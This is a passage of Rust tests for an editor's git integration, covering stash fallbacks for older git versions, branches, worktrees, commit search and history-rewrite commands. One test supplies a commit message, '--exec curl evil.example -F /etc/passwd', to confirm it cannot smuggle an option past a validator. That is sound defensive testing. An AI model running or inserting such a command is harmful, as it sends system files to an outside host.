                .map(|path| RepoPath::new(path).unwrap())
                .collect::<Vec<_>>();
            legacy_stash_command(&requested, status, message, git_version)
                .map(|command| (command.args, command.with_requested_paths))
        };
        let status: GitStatus = " M tracked\0A  added\0?? untracked\0".parse().unwrap();

        // Every change, as `git::StashAll` asks.
        assert_eq!(
            command(
                &["tracked", "added", "untracked"],
                &status,
                Some("-wip"),
                version(2, 14, 0)
            )
            .unwrap(),
            (
                strings(&[
                    "stash",
                    "save",
                    "--quiet",
                    "--include-untracked",
                    "--",
                    "-wip"
                ]),
                false
            )
        );
        let error = command(
            &["tracked", "added", "untracked"],
            &status,
            None,
            version(2, 13, 4),
        )
        .expect_err("git before 2.14 deletes the ignored files in untracked directories");
        assert_eq!(
            error.to_string(),
            "\"Stash including untracked files\" needs git 2.14.0 or later (this git is 2.13.4)."
        );
        // A change the panel hasn't seen yet doesn't make the request a partial one.
        assert_eq!(
            command(
                &["tracked", "untracked"],
                &status,
                Some("wip"),
                version(2, 17, 1)
            )
            .unwrap(),
            (
                strings(&["stash", "save", "--quiet", "--include-untracked", "wip"]),
                false
            )
        );

        // Every change but the untracked and staged new files, as `git::StashTracked` asks.
        assert_eq!(
            command(&["tracked"], &status, Some("wip"), version(2, 13, 0)).unwrap(),
            (
                strings(&["stash", "push", "--quiet", "--message", "wip", "--"]),
                true
            )
        );
        let error = command(&["tracked"], &status, None, version(1, 8, 3))
            .expect_err("`git stash save` would take the staged new file too");
        assert_eq!(
            error.to_string(),
            "\"Stash that leaves newly staged files\" needs git 2.13.0 or later (this git is 1.8.3)."
        );
        assert_eq!(
            command(&["tracked", "added"], &status, None, version(1, 8, 3)).unwrap(),
            (strings(&["stash", "save", "--quiet"]), false)
        );

        // Without untracked files to stash there's no `--include-untracked`, whose cleanup
        // deletes ignored files before git 2.14.
        let status: GitStatus = " M tracked\0".parse().unwrap();
        assert_eq!(
            command(&["tracked"], &status, None, version(1, 8, 3)).unwrap(),
            (strings(&["stash", "save", "--quiet"]), false)
        );
        assert_eq!(
            command(&["tracked"], &status, None, version(2, 13, 0)).unwrap(),
            (strings(&["stash", "push", "--quiet", "--"]), true)
        );
    }

    #[test]
    fn test_requests_untracked_files() {
        let paths = |paths: &[&str]| {
            paths
                .iter()
                .map(|path| RepoPath::new(path).unwrap())
                .collect::<Vec<_>>()
        };
        let status: GitStatus = " M tracked\0?? untracked\0".parse().unwrap();
        assert!(requests_untracked_files(
            &paths(&["tracked", "untracked"]),
            &status
        ));
        assert!(!requests_untracked_files(&paths(&["tracked"]), &status));
        assert!(!requests_untracked_files(&paths(&["stale"]), &status));
    }

    #[test]
    fn test_parse_remote_branches_containing() {
        assert_eq!(
            parse_remote_branches_containing(
                "  origin/HEAD -> origin/main\n  origin/feature/nested\n  origin/main\n"
            ),
            vec![
                SharedString::from("origin/feature/nested"),
                SharedString::from("origin/main")
            ]
        );
        assert!(parse_remote_branches_containing("").is_empty());
    }

    #[test]
    fn test_parse_initial_graph_output_with_wrapped_ref_names() {
        let sha = "1111111111111111111111111111111111111111";
        let parent = "2222222222222222222222222222222222222222";
        // `%d` of git before 2.2.
        let decorated = format!("{sha}\0{parent}\0 (HEAD, main, tag: v1)");
        let undecorated = format!("{parent}\0\0");
        let commits = parse_initial_graph_output(
            [decorated.as_str(), undecorated.as_str()].into_iter(),
            true,
        );
        assert_eq!(
            commits[0].ref_names,
            [
                SharedString::from("HEAD"),
                SharedString::from("main"),
                SharedString::from("tag: v1")
            ]
        );
        assert_eq!(commits[0].tag_names(), ["v1"]);
        assert!(commits[1].ref_names.is_empty());

        let unwrapped = format!("{sha}\0{parent}\0HEAD -> main, tag: v1");
        let commits = parse_initial_graph_output([unwrapped.as_str()].into_iter(), false);
        assert_eq!(
            commits[0].ref_names,
            [
                SharedString::from("HEAD -> main"),
                SharedString::from("tag: v1")
            ]
        );
    }

    #[gpui::test]
    async fn test_failing_version_probe_is_not_rerun_before_every_command(cx: &mut TestAppContext) {
        cx.executor().allow_parking();
        let directory = tempfile::tempdir().unwrap();
        let git_binary_path = directory.path().join("missing-git");
        let git = GitBinary::new(
            git_binary_path.clone(),
            directory.path().to_path_buf(),
            directory.path().join(".git"),
            cx.executor(),
            true,
        );
        let last_failure = || {
            GIT_BINARY_VERSIONS
                .lock()
                .get(&git_binary_path)
                .and_then(|probe| probe.try_lock().and_then(|probe| probe.last_failure))
        };

        assert_eq!(git.version().await, None);
        let first_failure = last_failure().expect("the failed probe should be remembered");
        assert_eq!(git.version().await, None);
        assert_eq!(
            last_failure(),
            Some(first_failure),
            "the probe shouldn't run again right away"
        );
    }

    fn installed_git_absolute_path() -> Option<PathBuf> {
        let file_name = if cfg!(windows) { "git.exe" } else { "git" };
        std::env::split_paths(&std::env::var_os("PATH")?)
            .map(|directory| directory.join(file_name))
            .find(|path| path.is_absolute() && path.is_file())
    }

    fn open_repository_with(
        dot_git_parent: &Path,
        git_binary_path: PathBuf,
        version: GitVersion,
        cx: &mut TestAppContext,
    ) -> RealGitRepository {
        let repository = RealGitRepository::new(
            &dot_git_parent.join(".git"),
            None,
            Some(git_binary_path),
            cx.executor(),
        )
        .expect("failed to open repository");
        if !GitFeature::HooksPath.is_supported_by(Some(version)) {
            repository.set_trusted(true);
        }
        repository
    }

    /// Runs the fallbacks for older git on the installed git by making it look older under its
    /// absolute path, which gets its own entry in the version cache. None of the versions is
    /// below 1.8, whose `git branch --set-upstream` modern git no longer has.
    #[gpui::test]
    async fn test_old_git_fallbacks_on_installed_git(cx: &mut TestAppContext) {
        let Some(git_binary_path) = installed_git_absolute_path() else {
            return;
        };
        let installed_version = installed_git_version();
        for version in [
            GitVersion::new(1, 8, 3),
            GitVersion::new(2, 7, 4),
            GitVersion::new(2, 14, 0),
        ] {
            if version > installed_version {
                continue;
            }
            pretend_git_version(git_binary_path.clone(), version);
            check_branches(git_binary_path.clone(), version, cx).await;
            check_worktrees(git_binary_path.clone(), version, cx).await;
            check_repository_operations(git_binary_path.clone(), version, cx).await;
            check_stash_keeps_ignored_files(git_binary_path.clone(), version, cx).await;
        }
    }

    #[gpui::test]
    async fn test_branches_on_installed_git(cx: &mut TestAppContext) {
        check_branches(PathBuf::from("git"), installed_git_version(), cx).await;
    }

    async fn check_branches(
        git_binary_path: PathBuf,
        version: GitVersion,
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let (_remote_directory, clone_directory) =
            clone_remote_repository_with_main_and_feature(temp_dir.path());
        git_command(
            &clone_directory,
            ["branch", "--track", "feature", "origin/feature"],
        );
        git_command(&clone_directory, ["branch", "nested/topic"]);
        fs::write(clone_directory.join("file.txt"), "ahead\n").unwrap();
        git_command(&clone_directory, ["commit", "-am", "ahead of origin"]);
        // What `git fetch --prune` leaves behind once `feature` is deleted on the remote.
        git_command(
            &clone_directory,
            ["update-ref", "-d", "refs/remotes/origin/feature"],
        );

        let repository = open_repository_with(&clone_directory, git_binary_path, version, cx);
        let scan = repository.branches().await.unwrap();
        assert_eq!(scan.error, None);
        let branch = |ref_name: &str| {
            scan.branches
                .iter()
                .find(|branch| branch.ref_name.as_ref() == ref_name)
                .unwrap_or_else(|| panic!("{ref_name} is missing from {:?}", scan.branches))
        };

        let main = branch("refs/heads/main");
        assert!(main.is_head);
        assert_eq!(
            main.upstream
                .as_ref()
                .map(|upstream| upstream.ref_name.as_ref()),
            Some("refs/remotes/origin/main")
        );
        assert_eq!(
            main.tracking_status(),
            Some(UpstreamTrackingStatus {
                ahead: 1,
                behind: 0
            })
        );
        let most_recent_commit = main.most_recent_commit.as_ref().unwrap();
        assert_eq!(most_recent_commit.subject.as_ref(), "ahead of origin");
        assert_eq!(most_recent_commit.author_name.as_ref(), "test");
        assert!(most_recent_commit.commit_timestamp > 0);
        assert!(most_recent_commit.has_parent);

        let feature = branch("refs/heads/feature");
        assert!(!feature.is_head);
        assert_eq!(
            feature.upstream.as_ref().map(|upstream| upstream.tracking),
            Some(UpstreamTracking::Gone)
        );
        assert!(!branch("refs/heads/nested/topic").is_head);
        assert!(branch("refs/remotes/origin/main").is_remote());
        assert_eq!(
            scan.branches.iter().filter(|branch| branch.is_head).count(),
            1
        );
        // The listing reads the ref files as well: a fresh clone keeps its branches as loose
        // files, and the tags are fingerprinted.
        assert!(
            scan.ref_storage
                .loose_refs
                .is_some_and(|loose_refs| loose_refs.complete && loose_refs.count >= 3),
            "{:?}",
            scan.ref_storage
        );
        assert!(scan.ref_storage.tags_fingerprint.is_some());

        // Only the current branch's counts are asked for; another branch with a live upstream
        // stays at zero rather than costing a history walk of its own.
        git_command(&clone_directory, ["branch", "behind", "origin/main"]);
        git_command(
            &clone_directory,
            ["branch", "--set-upstream-to", "main", "behind"],
        );
        let scan = repository.branches().await.unwrap();
        let behind = scan
            .branches
            .iter()
            .find(|branch| branch.ref_name.as_ref() == "refs/heads/behind")
            .unwrap_or_else(|| panic!("refs/heads/behind is missing from {:?}", scan.branches));
        assert_eq!(
            behind
                .upstream
                .as_ref()
                .map(|upstream| upstream.ref_name.as_ref()),
            Some("refs/heads/main")
        );
        assert_eq!(
            behind.tracking_status(),
            Some(UpstreamTrackingStatus {
                ahead: 0,
                behind: 0
            })
        );
    }

    #[gpui::test]
    async fn test_worktrees_on_installed_git(cx: &mut TestAppContext) {
        check_worktrees(PathBuf::from("git"), installed_git_version(), cx).await;
    }

    async fn check_worktrees(
        git_binary_path: PathBuf,
        version: GitVersion,
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        let repository = open_repository_with(&repo_dir, git_binary_path, version, cx);

        let worktrees = repository.worktrees().await.unwrap();
        assert_eq!(worktrees.len(), 1, "{worktrees:?}");
        assert!(worktrees[0].is_main);
        assert!(
            worktrees[0].sha.chars().all(|character| character == '0'),
            "an unborn branch should show the null object ID: {worktrees:?}"
        );
        assert_eq!(worktrees[0].branch_name(), Some("main"));

        git_command(&repo_dir, ["commit", "--allow-empty", "-m", "initial"]);
        let head = git_command_output(&repo_dir, ["rev-parse", "HEAD"]);
        let worktrees = repository.worktrees().await.unwrap();
        assert_eq!(worktrees.len(), 1, "{worktrees:?}");
        assert!(worktrees[0].is_main);
        assert_same_path(&worktrees[0].path, &repo_dir);
        assert_eq!(worktrees[0].sha.as_ref(), head);
        assert_eq!(worktrees[0].branch_name(), Some("main"));

        let installed_version = Some(version);
        let worktree_path = temp_dir.path().join("linked");
        let created = repository
            .create_worktree(
                CreateWorktreeTarget::Detached { base_sha: None },
                worktree_path.clone(),
            )
            .await;
        if GitFeature::WorktreeAdd.is_supported_by(installed_version) {
            created.unwrap();
            if GitFeature::WorktreeList.is_supported_by(installed_version) {
                assert_eq!(repository.worktrees().await.unwrap().len(), 2);
            }
        } else {
            let error = created.expect_err("git before 2.5 has no linked worktrees");
            assert!(
                error.to_string().contains("git 2.5.0 or later"),
                "unexpected error: {error:#}"
            );
        }

        let removed = repository.remove_worktree(worktree_path, true).await;
        if GitFeature::WorktreeRemove.is_supported_by(installed_version) {
            removed.unwrap();
        } else {
            let error = removed.expect_err("git before 2.17 has no `git worktree remove`");
            assert!(
                error.to_string().contains("git 2.17.0 or later"),
                "unexpected error: {error:#}"
            );
        }

        let repaired = repository.repair_worktrees().await;
        if GitFeature::WorktreeRepair.is_supported_by(installed_version) {
            repaired.unwrap();
        } else {
            let error = repaired.expect_err("git before 2.29 has no `git worktree repair`");
            assert!(
                error.to_string().contains("git 2.29.0 or later"),
                "unexpected error: {error:#}"
            );
        }
    }

    #[gpui::test]
    async fn test_repository_operations_on_installed_git(cx: &mut TestAppContext) {
        check_repository_operations(PathBuf::from("git"), installed_git_version(), cx).await;
    }

    async fn check_repository_operations(
        git_binary_path: PathBuf,
        version: GitVersion,
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let (_remote_directory, clone_directory) =
            clone_remote_repository_with_main_and_feature(temp_dir.path());
        let repository = open_repository_with(&clone_directory, git_binary_path, version, cx);
        let env = Arc::new(test_commit_envs());
        let head = git_command_output(&clone_directory, ["rev-parse", "HEAD"]);
        let feature_head = git_command_output(&clone_directory, ["rev-parse", "origin/feature"]);

        let details = repository.show("HEAD".to_string()).await.unwrap();
        assert_eq!(details.sha.as_ref(), head);
        assert_eq!(details.message.trim(), "initial");
        assert_eq!(details.author_email.as_ref(), "test@zed.dev");

        let commit_diff = repository
            .load_commit(head.clone(), false, cx.to_async())
            .await
            .unwrap();
        let [file] = commit_diff.files.as_slice() else {
            panic!("expected the initial commit to add one file");
        };
        assert_eq!(file.path.as_unix_str(), "file.txt");
        assert_eq!(file.old_content, None);
        assert_eq!(file.new_content.as_deref(), Some(b"main".as_slice()));

        assert_eq!(
            repository
                .revparse_batch(vec!["HEAD".to_string(), "refs/heads/missing".to_string()])
                .await
                .unwrap(),
            vec![Some(head.clone()), None]
        );

        assert_eq!(
            repository
                .diff_tree(DiffTreeType::MergeBase {
                    base: "HEAD".into(),
                    head: "origin/feature".into(),
                })
                .await
                .unwrap(),
            TreeDiff {
                entries: HashMap::from_iter([(
                    RepoPath::new("feature.txt").unwrap(),
                    TreeDiffStatus::Added
                )]),
            }
        );

        let (graph_tx, graph_rx) = async_channel::unbounded();
        repository
            .initial_graph_data(LogSource::All, LogOrder::AuthorDateOrder, graph_tx)
            .await
            .unwrap();
        let mut graph = Vec::new();
        while let Ok(chunk) = graph_rx.try_recv() {
            graph.extend(chunk);
        }
        let feature_commit = graph
            .iter()
            .find(|commit| commit.sha.to_string() == feature_head)
            .expect("the graph should include the feature branch");
        assert!(
            feature_commit
                .ref_names
                .iter()
                .any(|ref_name| ref_name.as_ref() == "origin/feature"),
            "unexpected ref names {:?}",
            feature_commit.ref_names
        );

        let search = async |args: SearchCommitArgs| {
            let (search_tx, search_rx) = async_channel::unbounded();
            repository
                .search_commits(LogSource::All, args, search_tx)
                .await
                .unwrap();
            let mut found = Vec::new();
            while let Ok(sha) = search_rx.try_recv() {
                found.push(sha.to_string());
            }
            found
        };

        assert_eq!(
            search(SearchCommitArgs {
                query: "FEATURE".into(),
                case_sensitive: false,
                ..SearchCommitArgs::default()
            })
            .await,
            [feature_head.as_str()]
        );

        assert_eq!(
            search(SearchCommitArgs {
                query: "".into(),
                case_sensitive: false,
                ..SearchCommitArgs::default()
            })
            .await,
            Vec::<String>::new(),
            "a search with nothing to match on must not answer with the whole history"
        );

        repository
            .create_branch("topic".to_string(), Some("origin/feature".to_string()))
            .await
            .unwrap();
        assert_eq!(
            git_command_output(&clone_directory, ["rev-parse", "HEAD"]),
            feature_head
        );
        repository.change_branch("main".to_string()).await.unwrap();
        repository
            .rename_branch("topic".to_string(), "renamed".to_string())
            .await
            .unwrap();
        repository
            .delete_branch(false, "renamed".to_string(), true)
            .await
            .unwrap();
        assert_eq!(
            repository
                .branches()
                .await
                .unwrap()
                .branches
                .iter()
                .filter(|branch| !branch.is_remote())
                .map(|branch| branch.ref_name.to_string())
                .collect::<Vec<_>>(),
            ["refs/heads/main"]
        );

        assert_eq!(
            repository.check_for_pushed_commit().await.unwrap(),
            [
                SharedString::from("origin/feature"),
                SharedString::from("origin/main")
            ]
        );

        fs::write(clone_directory.join("other.txt"), "other").unwrap();
        git_command(&clone_directory, ["add", "other.txt"]);
        git_command(
            &clone_directory,
            [
                "commit",
                "--author=Other Person <other@example.com>",
                "-m",
                "feature note",
            ],
        );
        let other_head = git_command_output(&clone_directory, ["rev-parse", "HEAD"]);

        assert_eq!(
            search(SearchCommitArgs {
                query: "".into(),
                authors: vec!["other person".into()],
                case_sensitive: false,
                ..SearchCommitArgs::default()
            })
            .await,
            [other_head.as_str()],
            "an author on its own must not carry an empty --grep, which would match everything"
        );
        assert_eq!(
            search(SearchCommitArgs {
                query: "".into(),
                authors: vec!["other@example.com".into()],
                case_sensitive: false,
                ..SearchCommitArgs::default()
            })
            .await,
            [other_head.as_str()],
            "--author matches the address in the header as well as the name"
        );
        // Whether git treats `--author` and `--grep` as AND or as OR is what decides
        // whether these two filters can be combined at all, so both directions are pinned here.
        assert_eq!(
            search(SearchCommitArgs {
                query: "feature".into(),
                authors: vec!["Other".into()],
                case_sensitive: false,
                ..SearchCommitArgs::default()
            })
            .await,
            [other_head.as_str()],
            "the commit whose message says `feature` but whose author is someone else must drop out"
        );
        assert_eq!(
            search(SearchCommitArgs {
                query: "initial".into(),
                authors: vec!["Other".into()],
                case_sensitive: false,
                ..SearchCommitArgs::default()
            })
            .await,
            Vec::<String>::new(),
            "an author that matches and a message that doesn't leaves nothing, so the two are anded"
        );
        assert_eq!(
            search(SearchCommitArgs {
                query: "".into(),
                authors: vec!["OTHER PERSON".into()],
                case_sensitive: true,
                ..SearchCommitArgs::default()
            })
            .await,
            Vec::<String>::new(),
            "--author follows the case sensitivity of the search"
        );
        // `git log --author=` on its own matches every commit, which is the one direction a
        // filter must never fail in. Only a peer's request can carry such an author.
        let (search_tx, search_rx) = async_channel::unbounded();
        let refused = repository
            .search_commits(
                LogSource::All,
                SearchCommitArgs {
                    query: "".into(),
                    authors: vec!["   ".into()],
                    case_sensitive: false,
                    ..SearchCommitArgs::default()
                },
                search_tx,
            )
            .await;
        assert!(
            refused.is_err(),
            "an author filter with nothing in it is refused rather than widened to everything"
        );
        assert!(
            search_rx.try_recv().is_err(),
            "and no commit is streamed back before it is refused"
        );

        let blame = repository
            .blame(
                RepoPath::new("file.txt").unwrap(),
                Rope::from("main"),
                LineEnding::Unix,
            )
            .await
            .unwrap();
        assert_eq!(
            blame
                .entries
                .iter()
                .map(|entry| entry.sha.to_string())
                .collect::<Vec<_>>(),
            [head.as_str()]
        );

        fs::write(clone_directory.join("file.txt"), "changed\n").unwrap();
        let diff = repository
            .diff(DiffType::MergeBase {
                base_ref: "origin/feature".into(),
            })
            .await
            .unwrap();
        assert!(diff.contains("+changed"), "unexpected diff {diff:?}");

        fs::write(clone_directory.join("untracked.txt"), "new\n").unwrap();
        let stash_everything = repository
            .stash_paths(
                vec![
                    RepoPath::new("file.txt").unwrap(),
                    RepoPath::new("untracked.txt").unwrap(),
                ],
                Some("everything".to_string()),
                env.clone(),
            )
            .await;
        if GitFeature::CleanKeepsIgnoredFiles.is_supported_by(Some(version)) {
            stash_everything.unwrap();
            assert!(!clone_directory.join("untracked.txt").exists());
            assert_eq!(
                fs::read_to_string(clone_directory.join("file.txt")).unwrap(),
                "main"
            );
            let stash = repository.stash_entries().await.unwrap();
            assert_eq!(stash.entries.len(), 1);
            assert_eq!(stash.entries[0].message, "everything");
            repository.stash_pop(None, env.clone()).await.unwrap();
        } else {
            let error = stash_everything.expect_err("git before 2.14 would lose ignored files");
            assert!(
                error.to_string().contains("git 2.14.0 or later"),
                "unexpected error: {error:#}"
            );
            assert!(repository.stash_entries().await.unwrap().entries.is_empty());
        }
        assert_eq!(
            fs::read_to_string(clone_directory.join("untracked.txt")).unwrap(),
            "new\n"
        );
        assert_eq!(
            fs::read_to_string(clone_directory.join("file.txt")).unwrap(),
            "changed\n"
        );

        // Every tracked change but no untracked file, as `git::StashTracked` asks.
        repository
            .stash_paths(vec![RepoPath::new("file.txt").unwrap()], None, env.clone())
            .await
            .unwrap();
        assert!(clone_directory.join("untracked.txt").exists());
        assert_eq!(
            fs::read_to_string(clone_directory.join("file.txt")).unwrap(),
            "main"
        );
        repository.stash_pop(None, env.clone()).await.unwrap();

        // Only some of the tracked changes.
        fs::write(clone_directory.join("added.txt"), "added\n").unwrap();
        repository
            .stage_paths(vec![RepoPath::new("added.txt").unwrap()], env.clone())
            .await
            .unwrap();
        let partial_stash = repository
            .stash_paths(vec![RepoPath::new("file.txt").unwrap()], None, env.clone())
            .await;
        if GitFeature::StashPush.is_supported_by(Some(version)) {
            partial_stash.unwrap();
            assert!(clone_directory.join("added.txt").exists());
            repository.stash_pop(None, env.clone()).await.unwrap();
        } else {
            let error = partial_stash.expect_err("git before 2.13 can't stash only some changes");
            assert!(
                error.to_string().contains("git 2.13.0 or later"),
                "unexpected error: {error:#}"
            );
        }
        assert_eq!(
            fs::read_to_string(clone_directory.join("file.txt")).unwrap(),
            "changed\n"
        );

        let checkpoint = repository.checkpoint().await.unwrap();
        fs::write(clone_directory.join("file.txt"), "after checkpoint\n").unwrap();
        fs::write(
            clone_directory.join("untracked-later.txt"),
            "untracked later\n",
        )
        .unwrap();
        fs::write(clone_directory.join("later.txt"), "later\n").unwrap();
        repository
            .stage_paths(vec![RepoPath::new("later.txt").unwrap()], env.clone())
            .await
            .unwrap();
        repository.restore_checkpoint(checkpoint).await.unwrap();
        assert_eq!(
            fs::read_to_string(clone_directory.join("file.txt")).unwrap(),
            "changed\n"
        );
        assert_eq!(
            fs::read_to_string(clone_directory.join("untracked.txt")).unwrap(),
            "new\n"
        );
        assert!(
            !clone_directory.join("later.txt").exists(),
            "a tracked file missing from the checkpoint should be removed"
        );
        assert_eq!(
            fs::read_to_string(clone_directory.join("untracked-later.txt")).unwrap(),
            "untracked later\n",
            "an untracked file created after the checkpoint should survive restoring it"
        );
        // Restoring a checkpoint leaves the index alone.
        assert!(git_command_output(&clone_directory, ["ls-files", "later.txt"]) == "later.txt");
    }

    #[gpui::test]
    async fn test_stash_keeps_ignored_files_on_installed_git(cx: &mut TestAppContext) {
        check_stash_keeps_ignored_files(PathBuf::from("git"), installed_git_version(), cx).await;
    }

    /// Stashing untracked files runs `git clean -d`, which before git 2.14 also deletes the
    /// ignored files inside untracked directories, and the stash doesn't keep them.
    async fn check_stash_keeps_ignored_files(
        git_binary_path: PathBuf,
        version: GitVersion,
        cx: &mut TestAppContext,
    ) {
        disable_git_global_config();
        cx.executor().allow_parking();

        let temp_dir = tempfile::tempdir().unwrap();
        let repo_dir = temp_dir.path().join("repo");
        git_init_repo(&repo_dir);
        fs::write(repo_dir.join(".gitignore"), "*.log\n").unwrap();
        fs::write(repo_dir.join("file.txt"), "committed\n").unwrap();
        git_command(&repo_dir, ["add", ".gitignore", "file.txt"]);
        git_command(&repo_dir, ["commit", "-m", "initial"]);
        let repository = open_repository_with(&repo_dir, git_binary_path, version, cx);
        let env = Arc::new(test_commit_envs());

        fs::write(repo_dir.join("file.txt"), "changed\n").unwrap();
        fs::create_dir_all(repo_dir.join("build")).unwrap();
        fs::write(repo_dir.join("build/output.log"), "ignored\n").unwrap();
        fs::write(repo_dir.join("build/new.txt"), "untracked\n").unwrap();
        // An untracked directory holding only ignored files doesn't show up in `git status`.
        fs::create_dir_all(repo_dir.join("cache")).unwrap();
        fs::write(repo_dir.join("cache/data.log"), "ignored\n").unwrap();
        let assert_ignored_files_survive = || {
            assert_eq!(
                fs::read_to_string(repo_dir.join("build/output.log")).unwrap(),
                "ignored\n"
            );
            assert_eq!(
                fs::read_to_string(repo_dir.join("cache/data.log")).unwrap(),
                "ignored\n"
            );
        };

        // Every tracked change, as `git::StashTracked` asks.
        repository
            .stash_paths(vec![RepoPath::new("file.txt").unwrap()], None, env.clone())
            .await
            .unwrap();
        assert_eq!(
            fs::read_to_string(repo_dir.join("file.txt")).unwrap(),
            "committed\n"
        );
        assert!(repo_dir.join("build/new.txt").exists());
        assert_ignored_files_survive();
        repository.stash_pop(None, env.clone()).await.unwrap();

        // Every change, as `git::StashAll` asks.
        let stash_everything = repository
            .stash_paths(
                vec![
                    RepoPath::new("file.txt").unwrap(),
                    RepoPath::new("build/new.txt").unwrap(),
                ],
                None,
                env.clone(),
            )
            .await;
        if GitFeature::CleanKeepsIgnoredFiles.is_supported_by(Some(version)) {
            stash_everything.unwrap();
            assert!(!repo_dir.join("build/new.txt").exists());
            assert_ignored_files_survive();
            repository.stash_pop(None, env.clone()).await.unwrap();
        } else {
            let error = stash_everything.expect_err("git before 2.14 would delete ignored files");
            assert!(
                error.to_string().contains("git 2.14.0 or later"),
                "unexpected error: {error:#}"
            );
            assert!(repository.stash_entries().await.unwrap().entries.is_empty());
            assert_ignored_files_survive();
        }
        assert_eq!(
            fs::read_to_string(repo_dir.join("build/new.txt")).unwrap(),
            "untracked\n"
        );
        assert_eq!(
            fs::read_to_string(repo_dir.join("file.txt")).unwrap(),
            "changed\n"
        );
    }

    /// The todo editor's plan turns into exactly the commands the fork allows, in the order that
    /// leaves the user's branch untouched until the final `rebase --onto`.
    #[test]
    fn test_rewrite_range_commands_build_the_scratch_branch_then_move_the_branch() {
        let groups = vec![
            RewriteGroup {
                shas: vec!["cccccccccccccccccccccccccccccccccccccccc".to_string()],
                message: None,
            },
            RewriteGroup {
                shas: vec![
                    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string(),
                    "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_string(),
                ],
                message: Some("A と B".to_string()),
            },
        ];
        let scratch = rewrite_scratch_branch_name("dddddddddddddddddddddddddddddddddddddddd");
        assert_eq!(scratch, "zed-rewrite/ddddddd");

        let commands = rewrite_range_commands(
            "0000000000000000000000000000000000000000",
            &groups,
            "dddddddddddddddddddddddddddddddddddddddd",
            "main",
            &scratch,
        )
        .unwrap();

        assert_eq!(
            commands
                .iter()
                .map(|command| command.args.join(" "))
                .collect::<Vec<_>>(),
            vec![
                "switch --no-overwrite-ignore -c zed-rewrite/ddddddd 0000000000000000000000000000000000000000"
                    .to_string(),
                "cherry-pick cccccccccccccccccccccccccccccccccccccccc".to_string(),
                concat!(
                    "cherry-pick -n aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ",
                    "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
                )
                .to_string(),
                "commit -m A と B".to_string(),
                concat!(
                    "rebase --autostash --onto zed-rewrite/ddddddd ",
                    "dddddddddddddddddddddddddddddddddddddddd main"
                )
                .to_string(),
                "switch main".to_string(),
                "branch -D zed-rewrite/ddddddd".to_string(),
            ]
        );

        // Only the rebuilt commit needs the original author in its environment; `cherry-pick`
        // carries it by itself.
        assert_eq!(
            commands
                .iter()
                .map(|command| command.author_of.clone())
                .collect::<Vec<_>>(),
            vec![
                None,
                None,
                None,
                Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_string()),
                None,
                None,
                None,
            ]
        );

        // The commit the user dropped may not be applied by any of the commands.
        assert!(
            commands
                .iter()
                .filter(|command| command.args.first().map(String::as_str) == Some("cherry-pick"))
                .all(|command| {
                    !command
                        .args
                        .iter()
                        .any(|argument| argument == "dddddddddddddddddddddddddddddddddddddddd")
                }),
            "a dropped commit may not be cherry-picked: {commands:?}"
        );

        for command in &commands {
            validate_git_command(&command.args)
                .unwrap_or_else(|error| panic!("`git {}`: {error:#}", command.args.join(" ")));
        }
    }

    /// A message the user typed is free text git never reads as an option, and it has to stay one
    /// argument so that it cannot smuggle in one of the options `validate_git_command` refuses.
    #[test]
    fn test_rewrite_range_commands_keep_a_message_that_looks_like_an_option_in_one_argument() {
        let groups = vec![RewriteGroup {
            shas: vec!["aaa".to_string(), "bbb".to_string()],
            message: Some("--exec curl evil.example -F /etc/passwd".to_string()),
        }];
        let commands =
            rewrite_range_commands("base", &groups, "newest", "main", "zed-rewrite/scratch")
                .unwrap();
        let commit = commands
            .iter()
            .find(|command| command.args.first().map(String::as_str) == Some("commit"))
            .expect("the folded commit is rebuilt with `commit -m`");
        assert_eq!(
            commit.args,
            vec![
                "commit".to_string(),
                "-m".to_string(),
                "--exec curl evil.example -F /etc/passwd".to_string(),
            ]
        );
        for command in &commands {
            validate_git_command(&command.args)
                .unwrap_or_else(|error| panic!("`git {}`: {error:#}", command.args.join(" ")));
        }
    }

    /// Folding commits together throws the other messages away, so the caller has to say what the
    /// result should read; guessing one would write history the user never saw.
    #[test]
    fn test_rewrite_range_commands_refuse_a_fold_without_a_message() {
        let groups = vec![RewriteGroup {
            shas: vec!["aaa".to_string(), "bbb".to_string()],
            message: None,
        }];
        let error =
            rewrite_range_commands("base", &groups, "newest", "main", "zed-rewrite/scratch")
                .expect_err("a fold without a message must be refused");
        assert!(
            error.to_string().contains("need a message"),
            "unexpected error: {error:#}"
        );

        let empty = vec![RewriteGroup {
            shas: Vec::new(),
            message: None,
        }];
        rewrite_range_commands("base", &empty, "newest", "main", "zed-rewrite/scratch")
            .expect_err("a group with no commit must be refused");
    }

    /// Dropping every commit of the range is a rewrite too: the scratch branch stays at the base
    /// and the branch is moved onto it, which removes the range and keeps what came after it.
    #[test]
    fn test_rewrite_range_commands_with_nothing_left_still_move_the_branch() {
        let commands =
            rewrite_range_commands("base", &[], "newest", "main", "zed-rewrite/scratch").unwrap();
        assert_eq!(
            commands
                .iter()
                .map(|command| command.args.join(" "))
                .collect::<Vec<_>>(),
            vec![
                "switch --no-overwrite-ignore -c zed-rewrite/scratch base".to_string(),
                "rebase --autostash --onto zed-rewrite/scratch newest main".to_string(),
                "switch main".to_string(),
                "branch -D zed-rewrite/scratch".to_string(),
            ]
        );
    }

    /// `branch -D` throws commits away, so the cleanup refuses any name that is not one of the
    /// scratch branches this fork creates.
    #[test]
    fn test_rewrite_cleanup_commands_only_delete_a_scratch_branch() {
        assert_eq!(
            rewrite_cleanup_commands("main", "zed-rewrite/abc1234").unwrap(),
            vec![
                vec!["switch".to_string(), "main".to_string()],
                vec![
                    "branch".to_string(),
                    "-D".to_string(),
                    "zed-rewrite/abc1234".to_string(),
                ],
            ]
        );
        for scratch in ["main", "", "zed-rewrite", "zed-rewrite/", "feature/work"] {
            assert!(
                rewrite_cleanup_commands("main", scratch).is_err(),
                "deleting `{scratch}` must be refused"
            );
        }
